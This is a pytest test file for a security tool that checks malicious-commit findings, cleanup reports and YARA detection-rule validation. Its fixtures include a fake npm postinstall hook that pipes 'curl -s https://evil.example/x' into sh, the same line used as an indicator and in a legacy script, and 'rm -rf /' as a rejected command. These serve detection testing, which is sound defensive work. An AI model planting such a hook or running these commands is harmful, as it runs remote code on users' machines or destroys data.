"""A Malicious change's static Proof and cleanup report (A07, ADR-0004 point 6). Application code
checks the indicators the agent drafted against the commit, hashes the files itself and lists the
commits and releases that contained the change. It validates the drafted Detection rule through the
runner's network-less detection_rule job, where yara only reads the trees, and a pass confirms the
Finding. The payload is only ever read as bytes."""

import base64
import hashlib
import io
import re
import tarfile

import pytest
from sqlalchemy import select

from conftest import FixtureBroker, application, connection, source_snapshot
from numen import detection, domain
from numen.artifacts import MAX_SUBMISSION, publish
from numen.broker import Broker
from numen.config import Config
from numen.models import Application, Commit, Notification, Repository, Snapshot
from numen.security import DomainError
from numen.sources import Sources
from numen.worker import run_once
from test_analysis import analyze
from test_artifacts import upload
from test_commit_review import assessment

# Copied verbatim from runner/tests/test_docker_runtime.py, which scans them on the real Engine.
POSTINSTALL_PARENT = {
    "package.json": '{\n  "name": "shop",\n  "version": "1.0.0",\n  "scripts": {\n    "start": "node server.js"\n  }\n}\n',
    "server.js": 'require("http").createServer((q,r)=>r.end("shop")).listen(8080);\n',
}
POSTINSTALL = {
    "changed": {"package.json": '{\n  "name": "shop",\n  "version": "1.0.1",\n  "scripts": {\n    "start": "node server.js",\n'
                                '    "postinstall": "touch /workspace/outputs/payload-ran && curl -s https://evil.example/x | sh"\n  }\n}\n'},
    "parent": POSTINSTALL_PARENT,
    "baseline": POSTINSTALL_PARENT,
}
POSTINSTALL_RULE = 'rule postinstall_loader { strings: $a = "payload-ran" $b = "evil.example/x" condition: all of them }'

TREE = {path: text.encode() for path, text in {**POSTINSTALL_PARENT, **POSTINSTALL["changed"]}.items()}
PAYLOAD = POSTINSTALL["changed"]["package.json"].splitlines()[5]
# The commit as GitHub reports it: package.json gains the payload, old.js goes, and logo.png, which
# the snapshot leaves out as media, arrives.
DIFF = "\n".join([
    "--- package.json", "+++ package.json", "@@ -1,6 +1,7 @@",
    " {", '   "name": "shop",', '-  "version": "1.0.0",', '+  "version": "1.0.1",', '   "scripts": {',
    '-    "start": "node server.js"', '+    "start": "node server.js",', "+" + PAYLOAD, "   }", " }",
    "--- old.js", "+++ old.js", "@@ -1 +0,0 @@", '-fetch("https://cdn.shop.example/old.js")',
])
FILES = [{"path": "package.json", "status": "modified"}, {"path": "old.js", "status": "removed"},
         {"path": "logo.png", "status": "added"}]
DRAFTS = {"report.md": b"# A postinstall loader", "detection-rule.yar": POSTINSTALL_RULE.encode()}


def postinstall(app, application_id, revision="a" * 40, **data):
    """The postinstall commit at `revision`, with its snapshot; its id."""
    ident = source_snapshot(app, application_id, revision, files=TREE)
    with app.state.factory.begin() as db:
        commit = db.get(Commit, ident)
        commit.data = {**commit.data, "files": FILES, "diff": DIFF, "parent_revisions": ["f" * 40],
                       "committed_at": "2026-11-01T00:00:00Z", **data}
    return ident


def malicious(**indicators):
    result = assessment("Malicious change", ref="a" * 40)
    return {**result, "indicators": {**result["indicators"], **indicators}}


def analysed(system, ident, result=None):
    """The Finding that the Analysis of commit `ident` opened or updated."""
    job, _ = analyze(system, ident, result or malicious(files=["package.json"]), DRAFTS)
    assert job["status"] == "succeeded", job
    return system[1].get(f"/api/findings/{job['result']['finding_id']}").json()


def test_the_cleanup_report_keeps_only_changed_files_and_strings_from_the_added_lines(system):
    app, client, _ = system
    connection(app)
    ident = postinstall(app, application(client)["id"])
    finding = analysed(system, ident, malicious(
        files=["package.json", "server.js", "old.js", "logo.png", "package.json"],
        hosts=["evil.example", "shop", "cdn.shop.example", "c2.example", ""],
        urls=["https://evil.example/x"],
        commands=["curl -s https://evil.example/x | sh", "rm -rf /"],
    ))
    not_added = "Not in the lines this commit added"
    assert finding["static_proof"]["indicators"] == {
        # Application code hashes the file from the commit's tree.
        "files": [{"path": "package.json", "sha256": hashlib.sha256(TREE["package.json"]).hexdigest()}],
        "hosts": ["evil.example"],
        "urls": ["https://evil.example/x"],
        "commands": ["curl -s https://evil.example/x | sh"],
        "rejected": [
            {"kind": "file", "value": "server.js", "reason": "Not a file this commit added or changed"},
            {"kind": "file", "value": "old.js", "reason": "Not a file this commit added or changed"},
            {"kind": "file", "value": "logo.png", "reason": "The stored snapshot does not hold this file"},
            {"kind": "host", "value": "shop", "reason": not_added},  # Only in a context line.
            {"kind": "host", "value": "cdn.shop.example", "reason": not_added},  # Only in a removed line.
            {"kind": "host", "value": "c2.example", "reason": not_added},
            {"kind": "host", "value": "", "reason": not_added},  # An empty string is in every line.
            {"kind": "command", "value": "rm -rf /", "reason": not_added},
        ],
    }


def test_the_cleanup_report_lists_the_commits_and_releases_that_contained_the_change(system, monkeypatch):
    app, client, _ = system
    connection(app)
    monitored = application(client)
    ident = postinstall(app, monitored["id"])
    backfilled = postinstall(app, monitored["id"], "c" * 40, backfill=True, committed_at="2026-09-01T00:00:00Z")
    stored = {}
    with app.state.factory.begin() as db:
        repository = db.get(Repository, db.get(Commit, ident).repository_id)
        repository.baseline_revision = "b" * 40
        for revision, when, generation, data in (
            ("0" * 40, "2026-10-01T00:00:00Z", 1, {}),
            ("2" * 40, "2026-11-03T00:00:00Z", 1, {}),
            ("1" * 40, "2026-11-02T00:00:00Z", 1, {}),
            ("3" * 40, "2026-11-02T12:00:00Z", 1, {"branch": "1.x"}),  # Another branch
            ("4" * 40, "2026-11-04T00:00:00Z", 0, {}),  # An earlier source generation
        ):
            row = Commit(repository_id=repository.id, source_generation=generation, revision=revision,
                         data={"committed_at": when, **data})
            db.add(row)
            db.flush()
            stored[revision] = row.id
    tags = [("v1.0.2", "2" * 40), ("v1.1.0", "3" * 40), ("v1.0.1", "a" * 40), ("v1.0.0", "0" * 40), ("v0.9.0", "b" * 40)]
    monkeypatch.setattr(Sources, "github_tags", lambda self, repository: tags)
    report = analysed(system, ident)["cleanup_report"]
    assert report["commits"] == [{"revision": "a" * 40, "commit_id": ident}] + [
        {"revision": r * 40, "commit_id": stored[r * 40]} for r in "12"]
    assert (report["releases"], report["commits_truncated"]) == (["v1.0.2", "v1.0.1"], False)
    # A Backfill commit is also contained in the Baseline, which no stored commit may hold.
    report = analysed(system, backfilled)["cleanup_report"]
    assert report["commits"] == [{"revision": "c" * 40, "commit_id": backfilled}] + [
        {"revision": r * 40, "commit_id": stored.get(r * 40, ident)} for r in "0a12"] + [
        {"revision": "b" * 40, "commit_id": None}]
    assert report["releases"] == ["v1.0.2", "v1.0.1", "v1.0.0", "v0.9.0"]
    # A failed tag request leaves the releases unknown, never empty.
    def unavailable(self, repository):
        raise DomainError("upstream_error", "Source returned HTTP 502", 502)
    monkeypatch.setattr(Sources, "github_tags", unavailable)
    assert analysed(system, ident)["cleanup_report"]["releases"] is None
    # A WordPress plugin has no tags to read. Its SVN paths name the snapshot's files by suffix.
    blog = application(client, asset_name="Blog", source_kind="wordpress", source_url=None,
                       plugin_slug="fixture", source_ref="trunk")
    svn = postinstall(app, blog["id"], "1", files=[{"path": "/fixture/trunk/package.json", "status": "M"},
                                                   {"path": "/fixture/trunk/old.js", "status": "D"}])
    finding = analysed(system, svn, malicious(files=["/fixture/trunk/package.json", "/fixture/trunk/old.js"]))
    assert finding["cleanup_report"]["releases"] is None
    assert finding["cleanup_report"]["commits"] == [{"revision": "1", "commit_id": svn}]
    indicators = finding["static_proof"]["indicators"]
    assert indicators["files"] == [{"path": "/fixture/trunk/package.json",
                                    "sha256": hashlib.sha256(TREE["package.json"]).hexdigest()}]
    assert [r["value"] for r in indicators["rejected"]] == ["/fixture/trunk/old.js", "return str(value)"]


def test_the_cleanup_report_keeps_the_secrets_to_rotate_and_no_alert_carries_it(system):
    app, client, _ = system
    connection(app)
    ident = postinstall(app, application(client)["id"])
    secrets = ["The npm publish token in the CI environment", "The deploy key in ~/.ssh/id_ed25519"]
    finding = analysed(system, ident, {**malicious(files=["package.json"]), "reachable_secrets": secrets})
    assert finding["cleanup_report"]["secrets"] == secrets
    # The cleanup report is shown on the Finding and never sent: the one Alert holds only the
    # fixed template's fields.
    with app.state.factory() as db:
        (alert,) = db.scalars(select(Notification))
    assert alert.event_key == f"finding:{finding['id']}:opened"
    assert alert.data == {"application": "Site", "account": None, "source": "aaaaaaa",
                          "verdict": "Malicious change · high confidence", "link": f"/findings/{finding['id']}"}


@pytest.mark.parametrize("files,message", [
    ({}, "No Detection rule was drafted"),
    ({"detection-rule.yar": b""}, "No Detection rule was drafted"),
    ({"detection-rule.yar": b"x" * (64 * 1024 + 1)}, "The Detection rule is larger than 64 KiB"),
    ({"detection-rule.yar": b"rule \xff {}"}, "The Detection rule is not UTF-8 text"),
])
def test_a_detection_rule_that_cannot_be_read_fails_its_rule_check(files, message):
    assert detection.rule_text(files) == (None, {"name": "rule", "status": "failed", "message": message})
    assert detection.rule_text({"detection-rule.yar": POSTINSTALL_RULE.encode()}) == (POSTINSTALL_RULE, None)
    proof = {"files": ["report.md"], "status": "failed", "checks": [detection.rule_text(files)[1]]}
    assert detection.static_state(proof) == {"status": "draft", "missing": ["detection-rule.yar", "indicators.json"],
                                             "limitations": [message], "vulnerable_version": None}
    validated = {"files": list(detection.STATIC_REQUIRED), "status": "validated", "checks": []}
    assert detection.static_state(validated)["status"] == "complete"


# Detection rule validation (A07): application code runs the drafted rule through the runner's
# detection_rule job, where yara only reads the trees, and confirms the Finding on a pass.
PARENT, BASELINE = "f" * 40, "b" * 40
SHIPPED = malicious(files=["package.json"], hosts=["evil.example"], urls=["https://evil.example/x"],
                    commands=["curl -s https://evil.example/x | sh"])
NOT_COMPILED = "line 1: syntax error, unexpected '}', expecting <condition>"
# An earlier release shipped the loader's download line in a script removed before the parent.
LEGACY = {**POSTINSTALL["baseline"], "legacy.sh": "curl -s https://evil.example/x | sh\n"}


def stored(app, repository_id, revision, files):
    """The snapshot of `revision` that intake keeps."""
    with app.state.factory.begin() as db:
        repository = db.get(Repository, repository_id)
        row = Snapshot(repository_id=repository_id, source_generation=repository.source_generation,
                       source_ref=revision, files=list(files))
        db.add(row)
        db.flush()
        publish(db, app.state.config.artifact_root, "snapshot", row.id, {p: t.encode() for p, t in files.items()})


def seeded(system, monkeypatch, monitored=None, parent=True, baseline=POSTINSTALL["baseline"], **data):
    """The postinstall commit M on `monitored`'s repository (an Own one by default), with its
    parent P and Baseline B stored as intake keeps them; M's id."""
    app, client, _ = system
    monitored = monitored or application(client, role="own", source_url="https://github.com/acme/shop")
    ident = postinstall(app, monitored["id"], **data)
    repository_id = monitored["repositories"][0]["repository_id"]
    with app.state.factory.begin() as db:
        db.get(Repository, repository_id).baseline_revision = BASELINE
    if parent:
        stored(app, repository_id, PARENT, POSTINSTALL["parent"])
    stored(app, repository_id, BASELINE, baseline)
    monkeypatch.setattr(Sources, "github_tags", lambda self, repository: [("v1.0.1", "a" * 40), ("v1.0.0", BASELINE)])
    return ident


def yara(call):
    """The runner's detection_rule run as yara answers it: a rule without a condition does not
    compile, and a file matches when it holds every string of the rule."""
    rule = call["files"]["rule.yar"].decode()
    if "condition:" not in rule:
        return {"compiled": False, "error": NOT_COMPILED}, {}
    strings = [s.encode() for s in re.findall(r'"([^"]*)"', rule)]
    matches = {}
    for path, content in sorted(call["files"].items()):
        tree, _, name = path.partition("/")
        if tree in detection.TREES:
            files = matches.setdefault(tree, {"files": [], "count": 0})["files"]
            if all(s in content for s in strings):
                files.append(name)
                matches[tree]["count"] += 1
    return {"compiled": True, "error": None, "matches": matches}, {}


def broker(rule=POSTINSTALL_RULE):
    """The agent finds the Malicious change and drafts `rule`; the detection_rule run is yara's."""
    return FixtureBroker(handler=lambda call: (SHIPPED, {**DRAFTS, "detection-rule.yar": rule.encode()})
                         if call["kind"] == "agent" else yara(call))


def settle(system, runs):
    """Runs every queued job but the Alerts: an Analysis, then each validation it queued."""
    app, _, config = system
    while run_once(config, app.state.factory, runs, exclude=("notification",)):
        pass


def validated(system, ident, runs):
    """Analyses commit `ident` and validates the static Proof it drafts: the Finding."""
    _, client, _ = system
    queued = client.post(f"/api/commits/{ident}/analyses", json={}).json()["job_id"]
    settle(system, runs)
    job = client.get(f"/api/jobs/{queued}").json()
    assert job["status"] == "succeeded", job
    return client.get(f"/api/findings/{job['result']['finding_id']}").json()


def test_a_malicious_postinstall_commit_ends_validated_with_a_cleanup_report_and_a_confirmed_finding(system, monkeypatch):
    app, client, _ = system
    connection(app)
    ident = seeded(system, monkeypatch)
    runs = broker()
    finding = validated(system, ident, runs)
    # AC-A07: no job ever executes the payload. The agent reads the diff and yara reads the trees.
    assert [call["kind"] for call in runs.calls] == ["agent", "detection_rule"]
    scan = runs.calls[1]
    assert (scan["profile"], scan["limits"], scan["policy"], scan["prompt"]) == (None, None, None, "")
    assert sorted(scan["files"]) == ["baseline/package.json", "baseline/server.js", "changed/package.json",
                                     "parent/package.json", "parent/server.js", "rule.yar"]
    assert scan["files"]["rule.yar"] == POSTINSTALL_RULE.encode()
    assert scan["files"]["changed/package.json"] == TREE["package.json"]
    proof = finding["static_proof"]
    assert proof["status"] == "validated" and proof["artifact_revision"] == finding["artifact_revision"]
    assert [(c["name"], c["status"]) for c in proof["checks"]] == [
        ("rule", "passed"), ("changed", "passed"), ("parent", "passed"), ("baseline", "passed")]
    assert [(c["files"], c["count"]) for c in proof["checks"][1:]] == [(["package.json"], 1), ([], 0), ([], 0)]
    assert finding["artifact_state"] == {"status": "complete", "missing": [], "limitations": [], "vulnerable_version": None}
    job = client.get(f"/api/jobs/{proof['job_id']}").json()
    assert (job["kind"], job["status"], job["result"]["current"]) == ("detection_rule", "succeeded", True)
    # A validated Detection rule confirms the Finding (A11).
    assert finding["status"] == "confirmed"
    cause = {k: finding["cause"][k] for k in ("by", "artifact_revision", "job_id")}
    assert cause == {"by": "detection_rule", "artifact_revision": finding["artifact_revision"], "job_id": job["id"]}
    assert [e["action"] for e in finding["events"]] == ["opened", "transition"]
    report = finding["cleanup_report"]
    assert report["commits"] == [{"revision": "a" * 40, "commit_id": ident}] and report["releases"] == ["v1.0.1"]
    assert report["secrets"] == SHIPPED["reachable_secrets"]
    assert [f["path"] for f in proof["indicators"]["files"]] == ["package.json"]


@pytest.mark.parametrize("check,rule,message", [
    ("rule", 'rule broken { strings: $a = "payload-ran" }', "The Detection rule does not compile: " + NOT_COMPILED),
    ("changed", 'rule other { strings: $a = "c2.example" condition: $a }',
     "The Detection rule matches none of the files this commit added or changed"),
    ("parent", 'rule start_script { strings: $a = "node server.js" condition: $a }',
     "The Detection rule also matches files in the parent tree"),
    ("baseline", 'rule loader_url { strings: $a = "evil.example/x" condition: $a }',
     "The Detection rule also matches files in the Baseline tree"),
])
def test_a_failing_check_leaves_draft_names_the_check_and_keeps_the_state(system, monkeypatch, check, rule, message):
    app, client, _ = system
    connection(app)
    ident = seeded(system, monkeypatch, baseline=LEGACY)
    runs = broker(rule)
    finding = validated(system, ident, runs)
    proof = finding["static_proof"]
    failed = {c["name"]: c["message"] for c in proof["checks"] if c["status"] == "failed"}
    assert proof["status"] == "failed" and failed[check] == message
    assert finding["artifact_state"]["status"] == "draft" and message in finding["artifact_state"]["limitations"]
    # The lifecycle state is unchanged: no transition is recorded.
    assert (finding["status"], finding["cause"]["by"]) == ("open", "verdict")
    assert [e["action"] for e in finding["events"]] == ["opened"]
    if check == "rule":
        assert proof["checks"] == [{"name": "rule", "status": "failed", "message": message}]
    # A Confirmed Finding whose re-draft fails stays Confirmed.
    upload(client, finding["id"], {"detection-rule.yar": POSTINSTALL_RULE.encode()})
    settle(system, runs)
    upload(client, finding["id"], {"detection-rule.yar": rule.encode()})
    settle(system, runs)
    current = client.get(f"/api/findings/{finding['id']}").json()
    assert (current["status"], current["cause"]["by"]) == ("confirmed", "detection_rule")
    assert current["static_proof"]["status"] == "failed" and current["artifact_state"]["status"] == "draft"
    assert [e["action"] for e in current["events"]] == ["opened", "artifacts_uploaded", "transition", "artifacts_uploaded"]


def test_a_backfill_commit_is_checked_against_its_parent_tree_only(system, monkeypatch):
    app, _, _ = system
    connection(app)
    # The Baseline came after a Backfill commit, so it still holds the loader.
    ident = seeded(system, monkeypatch, baseline={**POSTINSTALL["parent"], **POSTINSTALL["changed"]}, backfill=True)
    runs = broker()
    finding = validated(system, ident, runs)
    assert sorted(runs.calls[1]["files"]) == ["changed/package.json", "parent/package.json", "parent/server.js", "rule.yar"]
    assert finding["static_proof"]["checks"][-1] == {
        "name": "baseline", "status": "skipped", "message": "A Backfill commit is checked against its parent tree only"}
    assert (finding["static_proof"]["status"], finding["status"]) == ("validated", "confirmed")


def test_a_missing_tree_is_fetched_through_the_read_only_github_path(system, monkeypatch):
    app, _, _ = system
    connection(app)
    ident = seeded(system, monkeypatch, parent=False)
    fetched = []

    def tarball(self, repository, revision):
        fetched.append(revision)
        return {path: text.encode() for path, text in POSTINSTALL["parent"].items()}

    monkeypatch.setattr(Sources, "snapshot_github", tarball)
    runs = broker()
    finding = validated(system, ident, runs)
    assert fetched == [PARENT] and [call["kind"] for call in runs.calls] == ["agent", "detection_rule"]
    with app.state.factory() as db:
        (row,) = db.scalars(select(Snapshot).where(Snapshot.source_ref == PARENT))
        assert sorted(row.files) == ["package.json", "server.js"]
    assert (finding["static_proof"]["status"], finding["status"]) == ("validated", "confirmed")


def test_uploading_a_corrected_rule_validates_the_new_revision(system, monkeypatch):
    app, client, config = system
    connection(app)
    ident = seeded(system, monkeypatch)
    runs = broker('rule broken { strings: $a = "payload-ran" }')
    first = validated(system, ident, runs)
    assert (first["static_proof"]["status"], first["status"]) == ("failed", "open")
    # Two corrections are uploaded before either is validated, so the first is superseded.
    stale = upload(client, first["id"], {"detection-rule.yar": b'rule start_script { strings: $a = "node server.js" condition: $a }'}).json()
    fixed = upload(client, first["id"], {"detection-rule.yar": POSTINSTALL_RULE.encode()}).json()
    revisions = [row["static_proof"]["artifact_revision"] for row in (first, stale, fixed)]
    assert len(set(revisions)) == 3 and revisions[2] == fixed["artifact_revision"]
    for row in (stale, fixed):
        assert (row["static_proof"]["status"], row["static_proof"]["checks"], row["status"]) == ("pending", [], "open")
    assert len({row["static_proof"]["job_id"] for row in (first, stale, fixed)}) == 3
    run_once(config, app.state.factory, runs, exclude=("notification",))
    superseded = client.get(f"/api/jobs/{stale['static_proof']['job_id']}").json()
    assert superseded["result"]["status"] == "failed" and superseded["result"]["current"] is False
    after = client.get(f"/api/findings/{first['id']}").json()
    assert (after["static_proof"], after["status"]) == (fixed["static_proof"], "open")
    run_once(config, app.state.factory, runs, exclude=("notification",))
    final = client.get(f"/api/findings/{first['id']}").json()
    assert (final["static_proof"]["status"], final["status"]) == ("validated", "confirmed")
    assert final["cause"]["artifact_revision"] == fixed["artifact_revision"]


def test_generation_is_refused_for_a_malicious_change_finding(system):
    app, client, config = system
    connection(app)
    finding = analysed(system, postinstall(app, application(client)["id"]))
    refused = client.post(f"/api/findings/{finding['id']}/artifact-generations", json={})
    assert refused.status_code == 409 and refused.json()["code"] == "generation_not_available"
    # A generation queued before a later Verdict made the Finding a Malicious change is refused when
    # it runs, so its bundle never replaces the static Proof.
    with app.state.factory.begin() as db:
        queued = domain.submit_agent(db, "finding_artifacts", db.get(Application, finding["application_id"]),
                                     {"finding_id": finding["id"], "source_ref": None}).id
    runs = FixtureBroker()
    run_once(config, app.state.factory, runs, exclude=("notification", "detection_rule"))
    job = client.get(f"/api/jobs/{queued}").json()
    assert runs.calls == [] and (job["status"], job["error"]["code"]) == ("failed", "generation_not_available")
    assert client.get(f"/api/findings/{finding['id']}").json()["static_proof"] == finding["static_proof"]


def test_an_upstream_malicious_change_gets_a_static_proof_and_cleanup_report_in_each_application(system, monkeypatch):
    app, client, _ = system
    connection(app)
    shop, blog = (application(client, asset_name=name) for name in ("Shop", "Blog"))
    ident = seeded(system, monkeypatch, shop)
    runs = broker()
    validated(system, ident, runs)
    assert [call["kind"] for call in runs.calls] == ["agent", "detection_rule", "detection_rule"]
    rows = {row["application_id"]: client.get(f"/api/findings/{row['id']}").json()
            for row in client.get("/api/findings").json()["items"]}
    assert set(rows) == {shop["id"], blog["id"]}
    for row in rows.values():
        assert (row["status"], row["cause"]["by"], row["static_proof"]["status"]) == ("confirmed", "detection_rule", "validated")
        assert row["cleanup_report"]["secrets"] == SHIPPED["reachable_secrets"]
    proofs = [row["static_proof"] for row in rows.values()]
    assert proofs[0]["artifact_revision"] != proofs[1]["artifact_revision"] and proofs[0]["job_id"] != proofs[1]["job_id"]


def test_a_detection_rule_run_sends_each_tree_as_its_own_archive(monkeypatch):
    sent = []
    runner = Broker(Config())
    monkeypatch.setattr(runner, "request", lambda method, path, json=None: sent.append(json) or {"run_id": "r"})
    trees = {name: {path: text.encode() for path, text in tree.items()} for name, tree in POSTINSTALL.items()}
    files = {"rule.yar": POSTINSTALL_RULE.encode(), **{f"{name}/{p}": d for name, tree in trees.items() for p, d in tree.items()}}
    runner.submit("attempt", "detection_rule", files=files)
    (body,) = sent
    assert (body["kind"], body["profile"]) == ("detection_rule", {})
    assert [(i["path"], i.get("archive", False)) for i in body["inputs"]] == [
        ("rule.yar", False), ("changed", True), ("parent", True), ("baseline", True)]
    for item in body["inputs"][1:]:
        with tarfile.open(fileobj=io.BytesIO(base64.b64decode(item["content_base64"])), mode="r:gz") as archive:
            assert {member.name: archive.extractfile(member).read() for member in archive} == trees[item["path"]]
    # Within the runner's RULE_MAXIMA: 600 s, 1024 MB, 2 CPUs, 64 pids, 8 MiB out, 256 MiB in.
    assert body["limits"] == {"timeout_seconds": 600, "memory_mb": 1024, "cpus": 1, "pids": 64,
                              "output_bytes": 8 * 1024 * 1024, "input_bytes": MAX_SUBMISSION}
    # The file bound holds for each tree on its own.
    monkeypatch.setattr("numen.broker.MAX_SOURCE_FILES", 2)
    runner.submit("attempt", "detection_rule", files=files)
    with pytest.raises(DomainError) as refused:
        runner.submit("attempt", "detection_rule", files={**files, "parent/extra.js": b"x"})
    assert refused.value.code == "runtime_input_limit"


def test_a_malformed_validation_result_is_refused():
    for result in ({}, {"compiled": "yes"}, {"compiled": False}, {"compiled": True, "error": None},
                   {"compiled": True, "matches": {"changed": {"files": "package.json", "count": 1}}},
                   {"compiled": True, "matches": {"changed": {"files": [], "count": 0}}}):
        with pytest.raises(DomainError) as refused:
            detection.checks(result, {"changed", "parent"}, None)
        assert (refused.value.code, refused.value.status) == ("invalid_rule_result", 422)
    # A tree sent with no file, such as a root commit's parent, matches nothing.
    hit = {"files": ["package.json"], "count": 1}
    checks = detection.checks({"compiled": True, "error": None, "matches": {"changed": hit}}, {"changed"},
                              "The Baseline is the parent tree")
    assert [(c["name"], c["status"]) for c in checks] == [
        ("rule", "passed"), ("changed", "passed"), ("parent", "passed"), ("baseline", "skipped")]
